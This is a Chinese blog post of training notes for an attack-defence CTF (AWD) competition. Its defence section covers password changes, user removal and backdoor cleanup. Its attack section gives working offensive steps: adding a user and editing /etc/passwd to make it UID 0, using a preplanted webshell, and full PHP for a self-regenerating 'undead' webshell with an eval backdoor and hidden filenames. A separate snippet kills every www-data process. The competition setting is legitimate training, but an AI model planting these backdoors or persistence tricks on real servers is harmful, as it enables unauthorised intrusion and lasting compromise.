---
title: 【网络安全5x01】洞明科技网络安全红蓝对抗培训 --- day1
date: 2021-06-22 20:35:08
tags: [网络安全]
---

看来这网络安全是没完了，又搞护网、攻防、培训。一群门外汉，搞点小儿科，不知意义有多大。专业的事情交给专业的厂家来做不是更合适吗。

本来去年比赛拿第一之后我已经算是毕业了，我也对这个完全丧失兴趣了。是时候该去找新事物了。

新买了把机械键盘，正好试键盘，敲一点明天AWD的笔记给小伙伴用。

<!-- more -->

# AWD笔记

## 防守

### 1.改密码

``` bash
ssh root@[ip]:[port]   #ssh登录靶机

sudo passwd root       #修改root用户密码
```

### 2.删用户

``` bash
cat /etc/passwd     #看最后一行,
deluser [user]      #有奇怪的用户就删掉

控制面板 - 用户账户 - 删除用户账户   #win系统删用户方法
```

### 3.踢人

``` bash
w                  #显示现在在线的人
ps -ef | grep ssh  #如果有其它用户或者ip，就找到这个进程的[pid]
kill -9 [pid]      #杀掉进程
```

### 4.备份网站

使用ftp下载`/var/www/html/`目录到本地，然后启动**cnseay**工具扫网站漏洞后门。

### 5.修漏洞

`ma.php`这种预先放在目录下的后门，直接从ftp删除即可，其它的根据扫完情况再说。


## 攻击

### 1.登对方靶机

如果密码公开，抢先登录对方靶机，添加用户`config`：

``` bash
adduser config
#密码随便输两遍，其它全部回车
```

使用vim修改用户组为0：

``` bash
vi /etc/passwd
```
修改前`config:x:1001:1002:,,,:/home/config:/bin/bash`

修改后`config:x:0:1002:,,,:/home/config:/bin/bash`

### 2.连接对方预先放置的后门

地址：http://[ip]:[port]/ma.php

密码：cmd

连上去赶紧传不死马，`/var/www/html/`下各个目录随便传，越多越好。名字也要做好隐蔽,我一般常用`.config.php`，`.index.php`，`.struct.php`等等这种，前面加`.`表示隐藏。

不死马是指一个不停生成木马后门的木马，一旦执行，删文件没有用，必须要删进程才行。

这货长这样：

``` php
<?php

set_time_limit(0);

ignore_user_abort(true);

$file = '.config.php';

$shell = '<?php eval($_POST[cmd])?>';

while(true){

file_put_contents($file, $shell);

system('chmod 777 .config.php');

usleep(50);

}

?>
```
万一对手也会玩了，那就执行这个文件这样杀：

``` php
<?php

#@unlink('config.php');

exec("ps aux|grep www-data|grep -v grep|awk '{print $2}'|xargs kill -9");

?>
```

### 3.随意玩了

有且不只有后台弱口令、sql注入、文件包含、文件上传、命令执行、xss等漏洞，这个根据扫出来的情况随意玩了

不过其实种好不死马，就已经可以稳定获取flag了